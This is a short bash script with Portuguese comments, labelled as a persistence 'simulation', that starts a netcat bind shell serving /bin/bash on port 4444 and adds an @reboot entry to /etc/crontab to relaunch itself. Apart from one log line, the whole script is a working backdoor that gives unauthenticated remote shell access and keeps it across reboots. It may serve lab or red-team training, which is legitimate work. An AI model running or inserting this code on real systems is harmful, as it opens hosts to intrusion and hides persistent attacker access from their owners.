
#!/bin/bash
# Persistência: bind shell + cron
echo "[PERSISTÊNCIA] Simulação de persistência executada" >> /var/log/persistencia.log
nohup nc -lvp 4444 -e /bin/bash &
CRON="@reboot /usr/local/bin/persistencia_simulada.sh &"
CRON_FILE="/etc/crontab"
if ! grep -q persistencia_simulada "$CRON_FILE"; then
	echo "$CRON" >> "$CRON_FILE"
fi
